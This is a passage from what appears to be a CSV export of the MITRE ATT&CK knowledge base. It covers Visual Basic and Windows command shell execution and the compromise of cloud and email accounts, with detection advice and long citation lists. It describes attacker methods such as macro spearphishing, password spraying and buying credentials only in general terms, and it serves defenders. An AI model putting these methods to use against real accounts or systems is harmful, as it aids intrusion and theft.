Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",https://attack.mitre.org/techniques/T1059/005,09 March 2020,07 April 2023,enterprise-attack,1.4,Execution,"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.

Understanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.","Linux, Windows, macOS","Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1059,,,,0.0,,,,"(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Talos Emotet Jan 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Unit 42 Inception November 2018),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Booz Allen Hamilton),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Morphisec Snip3 May 2021),(Citation: Telefonica Snip3 December 2021),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Talos Group123),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: HP SVCReady Jun 2022),(Citation: Symantec Waterbug Jun 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec Shuckworm January 2022),(Citation: Lab52 WIRTE Apr 2019),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: CobaltStrike Daddy May 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Lokibot Jan 2021),(Citation: SecureWorks August 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Picus Sodinokibi January 2020),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Frankenstein June 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Proofpoint TA505 June 2018),(Citation: Kaspersky Adwind Feb 2016),(Citation: Check Point APT34 April 2021),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Talos Bisonal Mar 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Proofpoint TA459 April 2017),(Citation: CheckPoint Bandook Nov 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Microsoft Actinium February 2022),(Citation: FireEye Metamorfo Apr 2018),(Citation: Dragos Crashoverride 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Black Basta October 2022),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA2541 February 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: TrendMicro MacOS April 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Cylance Dust Storm),(Citation: Reaqta MuddyWater November 2017),(Citation: fsecure NanHaiShu July 2016),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Unit 42 Bisonal July 2018),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Trend Micro TA505 June 2019),(Citation: G Data Sodinokibi June 2019),(Citation: FireEye FIN7 Aug 2018),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Symantec Emotet Jul 2018),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Cyberint Qakbot May 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: FoxIT Wocao December 2019),(Citation: Group IB Cobalt Aug 2017),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Palo Alto Comnie),(Citation: Unit 42 KerrDown February 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Unit42 Molerat Mar 2020),(Citation: PTSecurity Higaisa 2020),(Citation: Juniper IcedID June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: McAfee Honeybee),(Citation: ESET Gamaredon June 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye NETWIRE March 2019),(Citation: Cofense NanoCore Mar 2018),(Citation: Eset Ramsay May 2020),(Citation: Mandiant UNC3313 Feb 2022),(Citation: ATT Sidewinder January 2021),(Citation: Bromium Ursnif Mar 2017),(Citation: McAfee Sharpshooter December 2018),(Citation: BlackBerry Bahamut),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Lazarus APT January 2022),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Donut Github),(Citation: Secureworks IRON TILDEN Profile),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Talos Kimsuky Nov 2021),(Citation: Symantec Bumblebee June 2022),(Citation: Volexity Patchwork June 2018),(Citation: Group IB Ransomware September 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Qualys LolZarus),(Citation: Talos PoetRAT October 2020),(Citation: Malwarebytes SmokeLoader 2016),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: CERT-EE Gamaredon January 2021),(Citation: Rancor Unit42 June 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: MuddyWater TrendMicro June 2018),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cisco Operation Layover September 2021),(Citation: ESET Telebots June 2017),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Kaspersky StoneDrill 2017),(Citation: 360 Machete Sep 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Github Koadic),(Citation: Proofpoint TA505 Sep 2017),(Citation: Unit42 Xbash Sept 2018),(Citation: ESET BlackEnergy Jan 2016),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft Holmium June 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Kroll Qakbot June 2020),(Citation: IBM TA505 April 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Securelist Remexi Jan 2019),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: win10_asr),(Citation: Default VBS macros Blocking )"
T1059.003,attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62,Command and Scripting Interpreter: Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)

Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",https://attack.mitre.org/techniques/T1059/003,09 March 2020,28 July 2023,enterprise-attack,1.3,Execution,"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",Windows,"Command: Command Execution, Process: Process Creation",True,T1059,,,,1.0,,,,"(Citation: Tarrask scheduled task),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Forcepoint Monsoon),(Citation: FireEye FELIXROOT July 2018),(Citation: Dell Lateral Movement),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: Unit42 OilRig Nov 2018),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Novetta Blockbuster),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Microsoft BlackCat Jun 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: Palo Alto OilRig Sep 2018),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Check Point Meteor Aug 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Sophos Netwalker May 2020),(Citation: FireEye admin@338),(Citation: FireEye APT30),(Citation: Unit 42 DarkHydrus July 2018),(Citation: CoinTicker 2019),(Citation: Cisco DNSMessenger March 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Check Point APT34 April 2021),(Citation: Korean FSI TA505 2020),(Citation: Symantec FIN8 Jul 2023),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CISA EB Aug 2020),(Citation: Dragos Crashoverride 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Fidelis INOCNATION),(Citation: Unit42 Cannon Nov 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Picus Emotet Dec 2018),(Citation: ESET InvisiMole June 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: EFF Manul Aug 2016),(Citation: PWC Cloud Hopper April 2017),(Citation: Cybereason Clop Dec 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: McAfee Cuba April 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: Sofacy DealersChoice),(Citation: Mandiant APT1 Appendix),(Citation: Fortinet Remcos Feb 2017),(Citation: Mandiant FIN13 Aug 2022),(Citation: Sophos Ragnar May 2020),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Unit 42 Kazuar May 2017),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: Symantec Linfo May 2012),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Bankshot),(Citation: ESET Gelsemium June 2021),(Citation: Zscaler Kasidet),(Citation: US-CERT Volgmer Nov 2017),(Citation: Cylance Shell Crew Feb 2017),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Fidelis njRAT June 2013),(Citation: Cybereason Soft Cell June 2019),(Citation: US-CERT HARDRAIN March 2018),(Citation: Mandiant FIN7 Apr 2022),(Citation: CIRCL PlugX March 2013),(Citation: JPCert TSCookie March 2018),(Citation: ESET LoudMiner June 2019),(Citation: McAfee Night Dragon),(Citation: BiZone Lizar May 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: Gigamon BADHATCH Jul 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: ESET EvilNum July 2020),(Citation: Volexity Patchwork June 2018),(Citation: Umbreon Trend Micro),(Citation: Malwarebytes Pony April 2016),(Citation: FireEye APT38 Oct 2018),(Citation: Sophos SamSam Apr 2018),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: FireEye APT32 May 2017),(Citation: 360 Machete Sep 2020),(Citation: FireEye APT10 April 2017),(Citation: Github Koadic),(Citation: FireEye Operation Double Tap),(Citation: Proofpoint NETWIRE December 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: Dell TG-3390),(Citation: FireEye Maze May 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Cisco H1N1 Part 2),(Citation: Securelist Remexi Jan 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Crowdstrike DNC June 2016),(Citation: Unit 42 BackConfig May 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Symantec Waterbug Jun 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Medium KONNI Jan 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Picus Sodinokibi January 2020),(Citation: Mandiant APT41),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Volexity SolarWinds),(Citation: Talos Bisonal Mar 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Sophos Maze VM September 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: Dell Sakula),(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye APT41 Aug 2019),(Citation: PWC WellMess July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Okrum July 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: TrendMicro Lazarus Nov 2018),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: OilRig ISMAgent July 2017),(Citation: Symantec Darkmoon Aug 2005),(Citation: Talos NavRAT May 2018),(Citation: SecureList Silence Nov 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit42 Emissary Panda May 2019),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye FIN7 Aug 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Trend Micro Daserf Nov 2017),(Citation: Secureworks Karagany July 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: FoxIT Wocao December 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: CISA Zebrocy Oct 2020),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: IBM MegaCortex),(Citation: Talos Cobalt Group July 2018),(Citation: Kaspersky QakBot September 2021),(Citation: PTSecurity Higaisa 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Secureworks MCMD July 2019),(Citation: Cofense NanoCore Mar 2018),(Citation: Cybereason Bazar July 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Palo Alto MoonWind March 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: Avira Mustang Panda January 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Malwarebytes Higaisa 2020),(Citation: CyberBit Dtrack),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Talos Seduploader Oct 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Lee 2013),(Citation: Qualys LolZarus),(Citation: ATT QakBot April 2021),(Citation: Symantec Wiarp May 2012),(Citation: FireEye APT33 Sept 2017),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: FireEye APT17),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Babuk February 2021),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET InvisiMole June 2020),(Citation: Talos GravityRAT),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: ESET LightNeuron May 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cybereason Astaroth Feb 2019),(Citation: Trend Micro Tick November 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Cylance Cleaver),(Citation: Mandiant FIN12 Oct 2021),(Citation: Talos Cobalt Strike September 2020),(Citation: Zscaler Higaisa 2020),(Citation: Cymmetria Patchwork),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Zscaler Bazar September 2020),(Citation: SecureWorks August 2019),(Citation: Check Point Warzone Feb 2020),(Citation: Github AD-Pentest-Script),(Citation: Talos Frankenstein June 2019),(Citation: Unit 42 SeaDuke 2015),(Citation: Palo Alto DNS Requests),(Citation: PaloAlto NanoCore Feb 2016),(Citation: PaloAlto DNS Requests May 2016),(Citation: TechNet Cmd),(Citation: JoeSecurity Egregor 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 PingPull Jun 2022),(Citation: Threatpost Lizar May 2021),(Citation: FireEye FIN10 June 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: McAfee Gold Dragon),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Accenture Hogfish April 2018),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: McAfee Lazarus Jul 2020),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Unit 42 Bisonal July 2018),(Citation: FireEye APT41 March 2020),(Citation: Bitdefender Naikon April 2021),(Citation: Radware Micropsia July 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: Mandiant APT1),(Citation: Lazarus RATANKBA),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: ESET Zebrocy May 2019),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Palo Alto Comnie),(Citation: Lotus Blossom Dec 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: NCC Group Chimera January 2021),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Crowdstrike Indrik November 2018),(Citation: Volexity PowerDuke November 2016),(Citation: RATANKBA),(Citation: Secureworks REvil September 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Carbon Black HotCroissant April 2020),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit42 RDAT July 2020),(Citation: CERT-EE Gamaredon January 2021),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Talos Konni May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Malwarebytes DarkComet March 2018),(Citation: FireEye CARBANAK June 2017),(Citation: Symantec Backdoor.Mivast),(Citation: Cyphort EvilBunny Dec 2014),(Citation: ESET TeleBots Oct 2018),(Citation: Talos Group123),(Citation: Symantec Suckfly May 2016),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Symantec Shuckworm January 2022),(Citation: Carbon Black JCry May 2019),(Citation: Symantec Sowbug Nov 2017),(Citation: Microsoft GALLIUM December 2019),(Citation: Bitdefender APT28 Dec 2015),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: US-CERT TA18-074A),(Citation: Github PowerShell Empire),(Citation: Unit 42 CARROTBAT January 2020),(Citation: APT15 Intezer June 2018),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: GitHub QuasarRAT),(Citation: FireEye Periscope March 2018),(Citation: Palo Alto Brute Ratel July 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: US-CERT Bankshot Dec 2017),(Citation: Trend Micro Black Basta October 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Cybereason Egregor Nov 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Talos Sodinokibi April 2019),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cylance Dust Storm),(Citation: Cybereason Cobalt Kitty 2017),(Citation: SentinelLabs Metador Sept 2022),(Citation: GDATA Zeus Panda June 2017),(Citation: Trend Micro TA505 June 2019),(Citation: Cybereason Molerats Dec 2020),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Talos TinyTurla September 2021),(Citation: McAfee Oceansalt Oct 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: F-Secure CozyDuke),(Citation: NCC Group APT15 Alive and Strong),(Citation: Intezer HiddenWasp Map 2019),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Unit42 Molerat Mar 2020),(Citation: Group IB Silence Sept 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: Cybereason StrifeWater Feb 2022),(Citation: McAfee Honeybee),(Citation: ESET Gamaredon June 2020),(Citation: ESET Sednit Part 2),(Citation: Trend Micro Ransomware February 2021),(Citation: KISA Operation Muzabi),(Citation: CrowdStrike Putter Panda),(Citation: Unit 42 TA551 Jan 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: ESET ComRAT May 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: Cylance Sodinokibi July 2019),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Symantec Buckeye),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Proofpoint TA505 October 2019),(Citation: Securelist Darkhotel Aug 2015),(Citation: FireEye Obfuscation June 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Talos PoetRAT October 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Rancor Unit42 June 2018),(Citation: Talos ZxShell Oct 2014),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET RTM Feb 2017),(Citation: Unit 42 WhisperGate January 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Google EXOTIC LILY March 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Dell TG-1314),(Citation: ESET Hermetic Wizard March 2022),(Citation: BitDefender BADHATCH Mar 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: McAfee GhostSecret),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: FireEye FIN7 March 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1586.003,attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a,Compromise Accounts: Cloud Accounts,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",https://attack.mitre.org/techniques/T1586/003,27 May 2022,21 October 2022,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).",PRE,,True,T1586,,Francesco Bigarella,,,,,,"(Citation: Mandiant APT29 Microsoft 365 2022),"
T1586.002,attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b,Compromise Accounts: Email Accounts,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).

A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.

